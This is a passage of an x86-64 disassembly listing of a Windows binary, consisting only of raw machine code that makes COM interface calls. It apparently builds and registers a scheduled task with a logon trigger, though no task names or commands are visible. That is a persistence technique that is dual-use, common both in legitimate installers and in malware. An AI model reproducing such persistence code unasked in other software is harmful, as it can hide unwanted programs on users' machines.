   1400025a9:	48 85 c0             	test   %rax,%rax
   1400025ac:	74 32                	je     0x1400025e0
   1400025ae:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400025b1:	33 c0                	xor    %eax,%eax
   1400025b3:	0f 11 03             	movups %xmm0,(%rbx)
   1400025b6:	48 89 43 10          	mov    %rax,0x10(%rbx)
   1400025ba:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   1400025be:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   1400025c5:	48 8d 0d a8 65 00 00 	lea    0x65a8(%rip),%rcx        # 0x140008b74
   1400025cc:	ff 15 ce 5c 00 00    	call   *0x5cce(%rip)        # 0x1400082a0
   1400025d2:	48 89 03             	mov    %rax,(%rbx)
   1400025d5:	48 85 c0             	test   %rax,%rax
   1400025d8:	0f 84 87 07 00 00    	je     0x140002d65
   1400025de:	eb 03                	jmp    0x1400025e3
   1400025e0:	49 8b de             	mov    %r14,%rbx
   1400025e3:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   1400025e8:	48 85 db             	test   %rbx,%rbx
   1400025eb:	0f 84 b6 07 00 00    	je     0x140002da7
   1400025f1:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   1400025f5:	48 8b 01             	mov    (%rcx),%rax
   1400025f8:	4c 8d 45 70          	lea    0x70(%rbp),%r8
   1400025fc:	48 8b 13             	mov    (%rbx),%rdx
   1400025ff:	ff 50 38             	call   *0x38(%rax)
   140002602:	8b f0                	mov    %eax,%esi
   140002604:	8b cf                	mov    %edi,%ecx
   140002606:	f0 0f c1 4b 10       	lock xadd %ecx,0x10(%rbx)
   14000260b:	83 f9 01             	cmp    $0x1,%ecx
   14000260e:	75 30                	jne    0x140002640
   140002610:	48 8b 0b             	mov    (%rbx),%rcx
   140002613:	48 85 c9             	test   %rcx,%rcx
   140002616:	74 09                	je     0x140002621
   140002618:	ff 15 92 5c 00 00    	call   *0x5c92(%rip)        # 0x1400082b0
   14000261e:	4c 89 33             	mov    %r14,(%rbx)
   140002621:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140002625:	48 85 c9             	test   %rcx,%rcx
   140002628:	74 09                	je     0x140002633
   14000262a:	e8 71 43 00 00       	call   0x1400069a0
   14000262f:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   140002633:	ba 18 00 00 00       	mov    $0x18,%edx
   140002638:	48 8b cb             	mov    %rbx,%rcx
   14000263b:	e8 60 43 00 00       	call   0x1400069a0
   140002640:	85 f6                	test   %esi,%esi
   140002642:	0f 88 fb 06 00 00    	js     0x140002d43
   140002648:	b9 18 00 00 00       	mov    $0x18,%ecx
   14000264d:	e8 56 43 00 00       	call   0x1400069a8
   140002652:	48 8b d8             	mov    %rax,%rbx
   140002655:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   14000265a:	48 85 c0             	test   %rax,%rax
   14000265d:	74 32                	je     0x140002691
   14000265f:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002662:	33 c0                	xor    %eax,%eax
   140002664:	0f 11 03             	movups %xmm0,(%rbx)
   140002667:	48 89 43 10          	mov    %rax,0x10(%rbx)
   14000266b:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   14000266f:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   140002676:	48 8d 0d fb 64 00 00 	lea    0x64fb(%rip),%rcx        # 0x140008b78
   14000267d:	ff 15 1d 5c 00 00    	call   *0x5c1d(%rip)        # 0x1400082a0
   140002683:	48 89 03             	mov    %rax,(%rbx)
   140002686:	48 85 c0             	test   %rax,%rax
   140002689:	0f 84 e1 06 00 00    	je     0x140002d70
   14000268f:	eb 03                	jmp    0x140002694
   140002691:	49 8b de             	mov    %r14,%rbx
   140002694:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140002699:	48 85 db             	test   %rbx,%rbx
   14000269c:	0f 84 05 07 00 00    	je     0x140002da7
   1400026a2:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   1400026a6:	48 8b 01             	mov    (%rcx),%rax
   1400026a9:	45 33 c0             	xor    %r8d,%r8d
   1400026ac:	48 8b 13             	mov    (%rbx),%rdx
   1400026af:	ff 50 78             	call   *0x78(%rax)
   1400026b2:	90                   	nop
   1400026b3:	8b c7                	mov    %edi,%eax
   1400026b5:	f0 0f c1 43 10       	lock xadd %eax,0x10(%rbx)
   1400026ba:	83 f8 01             	cmp    $0x1,%eax
   1400026bd:	75 30                	jne    0x1400026ef
   1400026bf:	48 8b 0b             	mov    (%rbx),%rcx
   1400026c2:	48 85 c9             	test   %rcx,%rcx
   1400026c5:	74 09                	je     0x1400026d0
   1400026c7:	ff 15 e3 5b 00 00    	call   *0x5be3(%rip)        # 0x1400082b0
   1400026cd:	4c 89 33             	mov    %r14,(%rbx)
   1400026d0:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400026d4:	48 85 c9             	test   %rcx,%rcx
   1400026d7:	74 09                	je     0x1400026e2
   1400026d9:	e8 c2 42 00 00       	call   0x1400069a0
   1400026de:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   1400026e2:	ba 18 00 00 00       	mov    $0x18,%edx
   1400026e7:	48 8b cb             	mov    %rbx,%rcx
   1400026ea:	e8 b1 42 00 00       	call   0x1400069a0
   1400026ef:	4c 89 75 60          	mov    %r14,0x60(%rbp)
   1400026f3:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   1400026f7:	48 8b 01             	mov    (%rcx),%rax
   1400026fa:	4c 8d 45 60          	lea    0x60(%rbp),%r8
   1400026fe:	33 d2                	xor    %edx,%edx
   140002700:	ff 50 48             	call   *0x48(%rax)
   140002703:	8b d8                	mov    %eax,%ebx
   140002705:	85 c0                	test   %eax,%eax
   140002707:	79 48                	jns    0x140002751
   140002709:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   14000270d:	48 8b 11             	mov    (%rcx),%rdx
   140002710:	ff 52 10             	call   *0x10(%rdx)
   140002713:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   140002717:	48 8b 11             	mov    (%rcx),%rdx
   14000271a:	ff 52 10             	call   *0x10(%rdx)
   14000271d:	ff 15 e5 5e 00 00    	call   *0x5ee5(%rip)        # 0x140008608
   140002723:	8b c3                	mov    %ebx,%eax
   140002725:	48 8b 8d c0 00 00 00 	mov    0xc0(%rbp),%rcx
   14000272c:	48 33 cc             	xor    %rsp,%rcx
   14000272f:	e8 4c 42 00 00       	call   0x140006980
   140002734:	4c 8d 9c 24 d0 01 00 	lea    0x1d0(%rsp),%r11
   14000273b:	00 
   14000273c:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140002740:	49 8b 73 18          	mov    0x18(%r11),%rsi
   140002744:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   140002748:	4d 8b 73 28          	mov    0x28(%r11),%r14
   14000274c:	49 8b e3             	mov    %r11,%rsp
   14000274f:	5d                   	pop    %rbp
   140002750:	c3                   	ret
   140002751:	4c 89 b5 88 00 00 00 	mov    %r14,0x88(%rbp)
   140002758:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   14000275c:	48 8b 01             	mov    (%rcx),%rax
   14000275f:	48 8d 95 88 00 00 00 	lea    0x88(%rbp),%rdx
   140002766:	ff 50 38             	call   *0x38(%rax)
   140002769:	85 c0                	test   %eax,%eax
   14000276b:	0f 88 5b 01 00 00    	js     0x1400028cc
   140002771:	b9 18 00 00 00       	mov    $0x18,%ecx
   140002776:	e8 2d 42 00 00       	call   0x1400069a8
   14000277b:	48 8b d8             	mov    %rax,%rbx
   14000277e:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140002783:	48 85 c0             	test   %rax,%rax
   140002786:	74 32                	je     0x1400027ba
   140002788:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000278b:	33 c0                	xor    %eax,%eax
   14000278d:	0f 11 03             	movups %xmm0,(%rbx)
   140002790:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140002794:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   140002798:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   14000279f:	48 8d 0d ea 63 00 00 	lea    0x63ea(%rip),%rcx        # 0x140008b90
   1400027a6:	ff 15 f4 5a 00 00    	call   *0x5af4(%rip)        # 0x1400082a0
   1400027ac:	48 89 03             	mov    %rax,(%rbx)
   1400027af:	48 85 c0             	test   %rax,%rax
   1400027b2:	0f 84 c3 05 00 00    	je     0x140002d7b
   1400027b8:	eb 03                	jmp    0x1400027bd
   1400027ba:	49 8b de             	mov    %r14,%rbx
   1400027bd:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   1400027c2:	48 85 db             	test   %rbx,%rbx
   1400027c5:	0f 84 dc 05 00 00    	je     0x140002da7
   1400027cb:	48 8b 8d 88 00 00 00 	mov    0x88(%rbp),%rcx
   1400027d2:	48 8b 01             	mov    (%rcx),%rax
   1400027d5:	48 8b 13             	mov    (%rbx),%rdx
   1400027d8:	ff 50 50             	call   *0x50(%rax)
   1400027db:	90                   	nop
   1400027dc:	8b c7                	mov    %edi,%eax
   1400027de:	f0 0f c1 43 10       	lock xadd %eax,0x10(%rbx)
   1400027e3:	83 f8 01             	cmp    $0x1,%eax
   1400027e6:	75 30                	jne    0x140002818
   1400027e8:	48 8b 0b             	mov    (%rbx),%rcx
   1400027eb:	48 85 c9             	test   %rcx,%rcx
   1400027ee:	74 09                	je     0x1400027f9
   1400027f0:	ff 15 ba 5a 00 00    	call   *0x5aba(%rip)        # 0x1400082b0
   1400027f6:	4c 89 33             	mov    %r14,(%rbx)
   1400027f9:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400027fd:	48 85 c9             	test   %rcx,%rcx
   140002800:	74 09                	je     0x14000280b
   140002802:	e8 99 41 00 00       	call   0x1400069a0
   140002807:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   14000280b:	ba 18 00 00 00       	mov    $0x18,%edx
   140002810:	48 8b cb             	mov    %rbx,%rcx
   140002813:	e8 88 41 00 00       	call   0x1400069a0
   140002818:	b9 18 00 00 00       	mov    $0x18,%ecx
   14000281d:	e8 86 41 00 00       	call   0x1400069a8
   140002822:	48 8b d8             	mov    %rax,%rbx
   140002825:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   14000282a:	48 85 c0             	test   %rax,%rax
   14000282d:	74 32                	je     0x140002861
   14000282f:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002832:	33 c0                	xor    %eax,%eax
   140002834:	0f 11 03             	movups %xmm0,(%rbx)
   140002837:	48 89 43 10          	mov    %rax,0x10(%rbx)
   14000283b:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   14000283f:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   140002846:	48 8d 0d 73 63 00 00 	lea    0x6373(%rip),%rcx        # 0x140008bc0
   14000284d:	ff 15 4d 5a 00 00    	call   *0x5a4d(%rip)        # 0x1400082a0
   140002853:	48 89 03             	mov    %rax,(%rbx)
   140002856:	48 85 c0             	test   %rax,%rax
   140002859:	0f 84 27 05 00 00    	je     0x140002d86
   14000285f:	eb 03                	jmp    0x140002864
   140002861:	49 8b de             	mov    %r14,%rbx
   140002864:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140002869:	48 85 db             	test   %rbx,%rbx
   14000286c:	0f 84 35 05 00 00    	je     0x140002da7
   140002872:	48 8b 8d 88 00 00 00 	mov    0x88(%rbp),%rcx
   140002879:	48 8b 01             	mov    (%rcx),%rax
   14000287c:	48 8b 13             	mov    (%rbx),%rdx
   14000287f:	ff 50 40             	call   *0x40(%rax)
   140002882:	90                   	nop
   140002883:	8b c7                	mov    %edi,%eax
   140002885:	f0 0f c1 43 10       	lock xadd %eax,0x10(%rbx)
   14000288a:	83 f8 01             	cmp    $0x1,%eax
   14000288d:	75 30                	jne    0x1400028bf
   14000288f:	48 8b 0b             	mov    (%rbx),%rcx
   140002892:	48 85 c9             	test   %rcx,%rcx
   140002895:	74 09                	je     0x1400028a0
   140002897:	ff 15 13 5a 00 00    	call   *0x5a13(%rip)        # 0x1400082b0
   14000289d:	4c 89 33             	mov    %r14,(%rbx)
   1400028a0:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400028a4:	48 85 c9             	test   %rcx,%rcx
   1400028a7:	74 09                	je     0x1400028b2
   1400028a9:	e8 f2 40 00 00       	call   0x1400069a0
   1400028ae:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   1400028b2:	ba 18 00 00 00       	mov    $0x18,%edx
   1400028b7:	48 8b cb             	mov    %rbx,%rcx
   1400028ba:	e8 e1 40 00 00       	call   0x1400069a0
   1400028bf:	48 8b 8d 88 00 00 00 	mov    0x88(%rbp),%rcx
   1400028c6:	48 8b 01             	mov    (%rcx),%rax
   1400028c9:	ff 50 10             	call   *0x10(%rax)
   1400028cc:	4c 89 b5 a0 00 00 00 	mov    %r14,0xa0(%rbp)
   1400028d3:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   1400028d7:	48 8b 01             	mov    (%rcx),%rax
   1400028da:	48 8d 95 a0 00 00 00 	lea    0xa0(%rbp),%rdx
   1400028e1:	ff 50 48             	call   *0x48(%rax)
   1400028e4:	8b d8                	mov    %eax,%ebx
   1400028e6:	85 c0                	test   %eax,%eax
   1400028e8:	79 23                	jns    0x14000290d
   1400028ea:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   1400028ee:	48 8b 11             	mov    (%rcx),%rdx
   1400028f1:	ff 52 10             	call   *0x10(%rdx)
   1400028f4:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   1400028f8:	48 8b 11             	mov    (%rcx),%rdx
   1400028fb:	ff 52 10             	call   *0x10(%rdx)
   1400028fe:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   140002902:	48 8b 01             	mov    (%rcx),%rax
   140002905:	ff 50 10             	call   *0x10(%rax)
   140002908:	e9 10 fe ff ff       	jmp    0x14000271d
   14000290d:	4c 89 b5 b0 00 00 00 	mov    %r14,0xb0(%rbp)
   140002914:	48 8b 8d a0 00 00 00 	mov    0xa0(%rbp),%rcx
   14000291b:	48 8b 01             	mov    (%rcx),%rax
   14000291e:	4c 8d 85 b0 00 00 00 	lea    0xb0(%rbp),%r8
   140002925:	ba 09 00 00 00       	mov    $0x9,%edx
   14000292a:	ff 50 50             	call   *0x50(%rax)
   14000292d:	8b d8                	mov    %eax,%ebx
   14000292f:	48 8b 8d a0 00 00 00 	mov    0xa0(%rbp),%rcx
   140002936:	48 8b 11             	mov    (%rcx),%rdx
   140002939:	ff 52 10             	call   *0x10(%rdx)
   14000293c:	85 db                	test   %ebx,%ebx
   14000293e:	78 52                	js     0x140002992
   140002940:	48 8b 8d b0 00 00 00 	mov    0xb0(%rbp),%rcx
   140002947:	48 8b 01             	mov    (%rcx),%rax
   14000294a:	ff 50 10             	call   *0x10(%rax)
   14000294d:	4c 89 75 78          	mov    %r14,0x78(%rbp)
   140002951:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140002955:	48 8b 01             	mov    (%rcx),%rax
   140002958:	48 8d 55 78          	lea    0x78(%rbp),%rdx
   14000295c:	ff 90 88 00 00 00    	call   *0x88(%rax)
   140002962:	8b d8                	mov    %eax,%ebx
   140002964:	85 c0                	test   %eax,%eax
   140002966:	78 82                	js     0x1400028ea
   140002968:	4c 89 b5 80 00 00 00 	mov    %r14,0x80(%rbp)
   14000296f:	48 8b 4d 78          	mov    0x78(%rbp),%rcx
   140002973:	48 8b 01             	mov    (%rcx),%rax
   140002976:	4c 8d 85 80 00 00 00 	lea    0x80(%rbp),%r8
   14000297d:	33 d2                	xor    %edx,%edx
   14000297f:	ff 50 60             	call   *0x60(%rax)
   140002982:	8b d8                	mov    %eax,%ebx
   140002984:	85 c0                	test   %eax,%eax
   140002986:	79 2d                	jns    0x1400029b5
   140002988:	48 8b 4d 78          	mov    0x78(%rbp),%rcx
   14000298c:	48 8b 11             	mov    (%rcx),%rdx
   14000298f:	ff 52 10             	call   *0x10(%rdx)
   140002992:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140002996:	48 8b 11             	mov    (%rcx),%rdx
   140002999:	ff 52 10             	call   *0x10(%rdx)
   14000299c:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   1400029a0:	48 8b 01             	mov    (%rcx),%rax
   1400029a3:	ff 50 10             	call   *0x10(%rax)
   1400029a6:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   1400029aa:	48 8b 01             	mov    (%rcx),%rax
   1400029ad:	ff 50 10             	call   *0x10(%rax)
   1400029b0:	e9 68 fd ff ff       	jmp    0x14000271d
   1400029b5:	4c 89 b5 90 00 00 00 	mov    %r14,0x90(%rbp)
   1400029bc:	48 8b 8d 80 00 00 00 	mov    0x80(%rbp),%rcx
   1400029c3:	48 8b 01             	mov    (%rcx),%rax
   1400029c6:	4c 8d 85 90 00 00 00 	lea    0x90(%rbp),%r8
   1400029cd:	48 8d 15 34 5d 00 00 	lea    0x5d34(%rip),%rdx        # 0x140008708
   1400029d4:	ff 10                	call   *(%rax)
   1400029d6:	8b d8                	mov    %eax,%ebx
   1400029d8:	85 c0                	test   %eax,%eax
   1400029da:	79 3a                	jns    0x140002a16
   1400029dc:	48 8b 8d 80 00 00 00 	mov    0x80(%rbp),%rcx
   1400029e3:	48 8b 11             	mov    (%rcx),%rdx
   1400029e6:	ff 52 10             	call   *0x10(%rdx)
   1400029e9:	48 8b 4d 78          	mov    0x78(%rbp),%rcx
   1400029ed:	48 8b 11             	mov    (%rcx),%rdx
   1400029f0:	ff 52 10             	call   *0x10(%rdx)
   1400029f3:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   1400029f7:	48 8b 01             	mov    (%rcx),%rax
   1400029fa:	ff 50 10             	call   *0x10(%rax)
   1400029fd:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   140002a01:	48 8b 01             	mov    (%rcx),%rax
   140002a04:	ff 50 10             	call   *0x10(%rax)
   140002a07:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   140002a0b:	48 8b 01             	mov    (%rcx),%rax
   140002a0e:	ff 50 10             	call   *0x10(%rax)
   140002a11:	e9 07 fd ff ff       	jmp    0x14000271d
   140002a16:	b9 18 00 00 00       	mov    $0x18,%ecx
   140002a1b:	e8 88 3f 00 00       	call   0x1400069a8
   140002a20:	48 8b d8             	mov    %rax,%rbx
   140002a23:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140002a28:	48 85 c0             	test   %rax,%rax
   140002a2b:	74 32                	je     0x140002a5f
   140002a2d:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002a30:	33 c0                	xor    %eax,%eax
   140002a32:	0f 11 03             	movups %xmm0,(%rbx)
   140002a35:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140002a39:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   140002a3d:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   140002a44:	48 8d 0d a5 61 00 00 	lea    0x61a5(%rip),%rcx        # 0x140008bf0
   140002a4b:	ff 15 4f 58 00 00    	call   *0x584f(%rip)        # 0x1400082a0
   140002a51:	48 89 03             	mov    %rax,(%rbx)
   140002a54:	48 85 c0             	test   %rax,%rax
   140002a57:	0f 84 34 03 00 00    	je     0x140002d91
   140002a5d:	eb 03                	jmp    0x140002a62
   140002a5f:	49 8b de             	mov    %r14,%rbx
   140002a62:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140002a67:	48 85 db             	test   %rbx,%rbx
   140002a6a:	0f 84 37 03 00 00    	je     0x140002da7
   140002a70:	48 8b 8d 90 00 00 00 	mov    0x90(%rbp),%rcx
   140002a77:	48 8b 01             	mov    (%rcx),%rax
   140002a7a:	48 8b 13             	mov    (%rbx),%rdx
   140002a7d:	ff 50 58             	call   *0x58(%rax)
   140002a80:	8b f0                	mov    %eax,%esi
   140002a82:	8b cf                	mov    %edi,%ecx
   140002a84:	f0 0f c1 4b 10       	lock xadd %ecx,0x10(%rbx)
   140002a89:	83 f9 01             	cmp    $0x1,%ecx
   140002a8c:	75 30                	jne    0x140002abe
   140002a8e:	48 8b 0b             	mov    (%rbx),%rcx
   140002a91:	48 85 c9             	test   %rcx,%rcx
   140002a94:	74 09                	je     0x140002a9f
   140002a96:	ff 15 14 58 00 00    	call   *0x5814(%rip)        # 0x1400082b0
   140002a9c:	4c 89 33             	mov    %r14,(%rbx)
   140002a9f:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140002aa3:	48 85 c9             	test   %rcx,%rcx
   140002aa6:	74 09                	je     0x140002ab1
   140002aa8:	e8 f3 3e 00 00       	call   0x1400069a0
   140002aad:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   140002ab1:	ba 18 00 00 00       	mov    $0x18,%edx
   140002ab6:	48 8b cb             	mov    %rbx,%rcx
   140002ab9:	e8 e2 3e 00 00       	call   0x1400069a0
   140002abe:	48 8b 8d 90 00 00 00 	mov    0x90(%rbp),%rcx
   140002ac5:	48 8b 01             	mov    (%rcx),%rax
   140002ac8:	ff 50 10             	call   *0x10(%rax)
   140002acb:	48 8b 8d 80 00 00 00 	mov    0x80(%rbp),%rcx
   140002ad2:	48 8b 01             	mov    (%rcx),%rax
   140002ad5:	ff 50 10             	call   *0x10(%rax)
   140002ad8:	48 8b 4d 78          	mov    0x78(%rbp),%rcx
   140002adc:	48 8b 01             	mov    (%rcx),%rax
   140002adf:	ff 50 10             	call   *0x10(%rax)
   140002ae2:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140002ae6:	85 f6                	test   %esi,%esi
   140002ae8:	0f 88 45 02 00 00    	js     0x140002d33
   140002aee:	4c 89 b5 98 00 00 00 	mov    %r14,0x98(%rbp)
   140002af5:	48 8b 01             	mov    (%rcx),%rax
   140002af8:	48 8d 95 98 00 00 00 	lea    0x98(%rbp),%rdx
   140002aff:	ff 50 58             	call   *0x58(%rax)
   140002b02:	4c 89 b5 a8 00 00 00 	mov    %r14,0xa8(%rbp)
   140002b09:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140002b0d:	48 8b 01             	mov    (%rcx),%rax
   140002b10:	48 8d 95 a8 00 00 00 	lea    0xa8(%rbp),%rdx
   140002b17:	ff 50 78             	call   *0x78(%rax)
   140002b1a:	85 c0                	test   %eax,%eax
   140002b1c:	78 5e                	js     0x140002b7c
   140002b1e:	48 8b 8d a8 00 00 00 	mov    0xa8(%rbp),%rcx
   140002b25:	48 85 c9             	test   %rcx,%rcx
   140002b28:	74 21                	je     0x140002b4b
   140002b2a:	48 8b 01             	mov    (%rcx),%rax
   140002b2d:	ba 01 00 00 00       	mov    $0x1,%edx
   140002b32:	ff 90 90 00 00 00    	call   *0x90(%rax)
   140002b38:	8b d8                	mov    %eax,%ebx
   140002b3a:	48 8b 8d a8 00 00 00 	mov    0xa8(%rbp),%rcx
   140002b41:	48 8b 11             	mov    (%rcx),%rdx
   140002b44:	ff 52 10             	call   *0x10(%rdx)
   140002b47:	85 db                	test   %ebx,%ebx
   140002b49:	78 31                	js     0x140002b7c
   140002b4b:	8b d7                	mov    %edi,%edx
   140002b4d:	48 8b 8d 98 00 00 00 	mov    0x98(%rbp),%rcx
   140002b54:	48 8b 01             	mov    (%rcx),%rax
   140002b57:	ff 90 b0 00 00 00    	call   *0xb0(%rax)
   140002b5d:	33 d2                	xor    %edx,%edx
   140002b5f:	48 8b 8d 98 00 00 00 	mov    0x98(%rbp),%rcx
   140002b66:	48 8b 01             	mov    (%rcx),%rax
   140002b69:	ff 90 30 01 00 00    	call   *0x130(%rax)
   140002b6f:	48 8b 8d 98 00 00 00 	mov    0x98(%rbp),%rcx
   140002b76:	48 8b 01             	mov    (%rcx),%rax
   140002b79:	ff 50 10             	call   *0x10(%rax)
   140002b7c:	4c 89 b5 b8 00 00 00 	mov    %r14,0xb8(%rbp)
   140002b83:	b8 08 00 00 00       	mov    $0x8,%eax
   140002b88:	66 89 44 24 70       	mov    %ax,0x70(%rsp)
   140002b8d:	48 8d 0d a4 60 00 00 	lea    0x60a4(%rip),%rcx        # 0x140008c38
   140002b94:	ff 15 06 57 00 00    	call   *0x5706(%rip)        # 0x1400082a0
   140002b9a:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   140002b9f:	48 85 c0             	test   %rax,%rax
   140002ba2:	0f 84 0a 02 00 00    	je     0x140002db2
   140002ba8:	0f 10 44 24 70       	movups 0x70(%rsp),%xmm0
   140002bad:	0f 11 45 e0          	movups %xmm0,-0x20(%rbp)
   140002bb1:	f2 0f 10 45 80       	movsd  -0x80(%rbp),%xmm0
   140002bb6:	f2 0f 11 44 24 50    	movsd  %xmm0,0x50(%rsp)
   140002bbc:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   140002bc0:	ff 15 e2 56 00 00    	call   *0x56e2(%rip)        # 0x1400082a8
   140002bc6:	90                   	nop
   140002bc7:	0f 10 45 90          	movups -0x70(%rbp),%xmm0
   140002bcb:	0f 11 45 c0          	movups %xmm0,-0x40(%rbp)
   140002bcf:	f2 0f 10 45 a0       	movsd  -0x60(%rbp),%xmm0
   140002bd4:	f2 0f 11 44 24 60    	movsd  %xmm0,0x60(%rsp)
   140002bda:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   140002bde:	ff 15 c4 56 00 00    	call   *0x56c4(%rip)        # 0x1400082a8
   140002be4:	90                   	nop
   140002be5:	0f 10 45 e0          	movups -0x20(%rbp),%xmm0
   140002be9:	0f 29 45 40          	movaps %xmm0,0x40(%rbp)
   140002bed:	f2 0f 10 44 24 50    	movsd  0x50(%rsp),%xmm0
   140002bf3:	f2 0f 11 45 50       	movsd  %xmm0,0x50(%rbp)
   140002bf8:	0f 10 45 c0          	movups -0x40(%rbp),%xmm0
   140002bfc:	0f 29 45 20          	movaps %xmm0,0x20(%rbp)
   140002c00:	f2 0f 10 44 24 60    	movsd  0x60(%rsp),%xmm0
   140002c06:	f2 0f 11 45 30       	movsd  %xmm0,0x30(%rbp)
   140002c0b:	0f 10 45 a8          	movups -0x58(%rbp),%xmm0
   140002c0f:	0f 29 45 00          	movaps %xmm0,0x0(%rbp)
   140002c13:	f2 0f 10 4d b8       	movsd  -0x48(%rbp),%xmm1
   140002c18:	f2 0f 11 4d 10       	movsd  %xmm1,0x10(%rbp)
   140002c1d:	b9 18 00 00 00       	mov    $0x18,%ecx
   140002c22:	e8 81 3d 00 00       	call   0x1400069a8
   140002c27:	48 8b d8             	mov    %rax,%rbx
   140002c2a:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140002c2f:	48 85 c0             	test   %rax,%rax
   140002c32:	74 32                	je     0x140002c66
   140002c34:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002c37:	33 c0                	xor    %eax,%eax
   140002c39:	0f 11 03             	movups %xmm0,(%rbx)
   140002c3c:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140002c40:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   140002c44:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   140002c4b:	48 8d 0d 26 5f 00 00 	lea    0x5f26(%rip),%rcx        # 0x140008b78
   140002c52:	ff 15 48 56 00 00    	call   *0x5648(%rip)        # 0x1400082a0
   140002c58:	48 89 03             	mov    %rax,(%rbx)
   140002c5b:	48 85 c0             	test   %rax,%rax
   140002c5e:	0f 84 38 01 00 00    	je     0x140002d9c
   140002c64:	eb 03                	jmp    0x140002c69
   140002c66:	49 8b de             	mov    %r14,%rbx
   140002c69:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140002c6e:	48 85 db             	test   %rbx,%rbx
   140002c71:	0f 84 e3 00 00 00    	je     0x140002d5a
   140002c77:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   140002c7b:	48 8b 01             	mov    (%rcx),%rax
   140002c7e:	48 8d 95 b8 00 00 00 	lea    0xb8(%rbp),%rdx
   140002c85:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   140002c8a:	48 8d 55 40          	lea    0x40(%rbp),%rdx
   140002c8e:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   140002c93:	c7 44 24 30 03 00 00 	movl   $0x3,0x30(%rsp)
   140002c9a:	00 
   140002c9b:	48 8d 55 20          	lea    0x20(%rbp),%rdx
   140002c9f:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   140002ca4:	48 8d 55 00          	lea    0x0(%rbp),%rdx
   140002ca8:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140002cad:	41 b9 06 00 00 00    	mov    $0x6,%r9d
   140002cb3:	4c 8b 45 60          	mov    0x60(%rbp),%r8
   140002cb7:	48 8b 13             	mov    (%rbx),%rdx
   140002cba:	ff 90 88 00 00 00    	call   *0x88(%rax)
   140002cc0:	8b f0                	mov    %eax,%esi
   140002cc2:	f0 0f c1 7b 10       	lock xadd %edi,0x10(%rbx)
   140002cc7:	83 ff 01             	cmp    $0x1,%edi
   140002cca:	75 31                	jne    0x140002cfd
   140002ccc:	48 8b 0b             	mov    (%rbx),%rcx
   140002ccf:	48 85 c9             	test   %rcx,%rcx
   140002cd2:	74 09                	je     0x140002cdd
   140002cd4:	ff 15 d6 55 00 00    	call   *0x55d6(%rip)        # 0x1400082b0
   140002cda:	4c 89 33             	mov    %r14,(%rbx)
   140002cdd:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140002ce1:	48 85 c9             	test   %rcx,%rcx
   140002ce4:	74 09                	je     0x140002cef
   140002ce6:	e8 b5 3c 00 00       	call   0x1400069a0
   140002ceb:	4c 89 73 08          	mov    %r14,0x8(%rbx)
